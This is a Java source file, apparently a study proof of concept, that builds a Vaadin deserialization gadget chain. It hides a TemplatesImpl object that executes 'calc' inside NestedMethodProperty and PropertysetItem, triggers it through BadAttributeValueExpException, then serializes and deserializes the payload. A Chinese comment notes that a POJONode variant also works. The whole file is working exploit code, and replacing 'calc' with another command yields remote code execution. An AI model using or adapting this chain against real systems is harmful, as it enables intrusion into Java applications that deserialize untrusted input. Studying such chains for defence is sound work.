package Seri;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

public class VaadinGadgets {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Utils.createTemplatesImpl("calc");

        PropertysetItem propertyset = new PropertysetItem();

        NestedMethodProperty nestedMethodProperty = new NestedMethodProperty<>(templates ,"OutputProperties");
        propertyset.addItemProperty("OutputProperties" ,nestedMethodProperty);

        /**
         * 这里用POJONOde也能调用成功，但是打断点没有调用到getValue，不知道是哪儿触发的
         */
//        POJONode pojoNode = new POJONode(nestedMethodProperty);
//        Utils.setValue(bad, "val", pojoNode);
        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        Utils.setValue(bad, "val", propertyset);

        Utils.serialize(bad ,"bin/vaadin.bin");
        Utils.unserialize("bin/vaadin.bin");
    }
}
